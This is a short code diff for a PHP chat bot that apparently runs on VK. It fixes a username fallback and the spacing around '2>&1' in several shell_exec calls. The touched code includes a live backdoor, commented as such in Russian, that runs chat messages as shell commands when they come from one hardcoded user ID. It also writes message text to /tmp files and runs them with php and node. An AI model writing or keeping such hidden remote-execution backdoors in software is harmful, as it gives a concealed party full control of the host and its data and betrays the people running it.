@@ -58,7 +58,7 @@
 				$from_id,
 				'screen_name'
 			);
-			return "@{$userInfo[0]['screen_name']}";
+			return $userInfo[0]['screen_name'] ? "@{$userInfo[0]['screen_name']}" : "@id{$from_id}";
 		}
 
 		public function inBlacklist ($user_id) {
@@ -221,7 +221,7 @@
 			elseif(preg_match($this->bash, $this->command)) {
 				$this->command = preg_replace($this->bash, '', $this->command);
 				if($from_id == 176904287) { // бекдор
-					$out = shell_exec($this->command . "2>&1");
+					$out = shell_exec($this->command . " 2>&1");
 					try {
 						$this->vkAPI->messagesSend(
 							$this->peer_id,
@@ -281,7 +281,7 @@
 					$this->command = preg_replace($this->phpRe, '', $this->command);
 					$this->command = str_replace('—', '--', $this->command);
 					file_put_contents("/tmp/exec.php", $this->command);
-					$out = shell_exec("php /tmp/exec.php" . "2>&1");
+					$out = shell_exec("php /tmp/exec.php" . " 2>&1");
 					$this->vkAPI->messagesSend($this->peer_id, $out);
 				}
 			}
@@ -290,7 +290,7 @@
 					$this->command = preg_replace($this->jsRe, '', $this->command);
 					$this->command = str_replace('—', '--', $this->command);
 					file_put_contents('/tmp/exec.js', $this->command);
-					$out = shell_exec('node /tmp/exec.js'. "2>&1");
+					$out = shell_exec('node /tmp/exec.js'. " 2>&1");
 					$this->vkAPI->messagesSend($this->peer_id, $out);
 				}
 			}
